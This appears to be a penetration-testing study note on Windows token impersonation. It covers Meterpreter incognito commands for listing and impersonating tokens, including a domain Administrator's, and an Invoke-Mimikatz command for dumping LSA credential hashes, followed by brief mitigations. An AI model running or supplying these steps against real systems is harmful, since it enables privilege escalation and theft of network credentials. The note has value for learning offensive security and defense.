Token Impersonation

# Token Impersonation

**Overview:**
Tokens are temporary keys that allow ypu to access system/network without having to provide credentials each time you access a file. Basically cookies for your computer

Two Types:
- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - “non interactive” such as attaching a network drive or a domain logon script


**Method:**
Get a psexec meterpreter session.

meterpreter> `load incognito`
meterpreter> `list_tokens -i`
...
meterpreter> `impersonate_token <Domain>\\<user>`

Possible that a domain admin token is availible
meterpreter>  `impersonate_token <Domain>\\Administrator`
meterpreter> `shell`
meterpreter> `Invoke-Mimikatz -Command ‘"privilege: :debug" “LSADump : :LSA /patch” exit' -Computer <Computer>.<domain>`
Dump hashes in network 

**Mitigation:**
- Limit user/group token creation permissions
- Account Tiering
- Local Admin restriction

